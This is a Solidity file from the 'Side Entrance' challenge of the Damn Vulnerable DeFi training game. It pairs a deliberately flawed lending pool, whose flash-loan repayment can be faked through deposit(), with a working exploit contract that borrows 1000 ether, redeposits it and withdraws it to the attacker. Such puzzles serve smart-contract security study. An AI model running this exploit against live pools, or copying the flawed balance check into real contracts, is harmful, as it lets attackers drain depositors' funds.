// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "@solmate/utils/SafeTransferLib.sol";

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

/**
 * @title SideEntranceLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract SideEntranceLenderPool {
    mapping(address => uint256) private balances;

    error RepayFailed();

    event Deposit(address indexed who, uint256 amount);
    event Withdraw(address indexed who, uint256 amount);

    function deposit() external payable {
        unchecked {
            balances[msg.sender] += msg.value;
        }
        emit Deposit(msg.sender, msg.value);
    }

    function withdraw() external {
        uint256 amount = balances[msg.sender];
        
        delete balances[msg.sender];
        emit Withdraw(msg.sender, amount);

        SafeTransferLib.safeTransferETH(msg.sender, amount);
    }

    function flashLoan(uint256 amount) external {
        uint256 balanceBefore = address(this).balance;

        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();

        if (address(this).balance < balanceBefore)
            revert RepayFailed();
    }
}

contract ExploitContract {
    SideEntranceLenderPool public pool;

    constructor(SideEntranceLenderPool pool_) {
        pool = pool_;
    }

    // Write your exploit code below
    /**
     * Exploit is possible because of cross-functional re-entrancy between `flashLoan` and `deposit`.
     * - first take the flash loan to get the control over the execution
     * - repay by calling `deposit` that also updates balance
     * - withdraw balance
     */
    function exploit() public {
        pool.flashLoan(1000 ether);

        // initiate withdraw
        pool.withdraw();

        // transfer ETH to the attacker EOA
        payable(msg.sender).transfer(1000 ether);
    }

    function execute() public payable {
        pool.deposit{value: 1000 ether}();
    }

    receive() external payable {}
}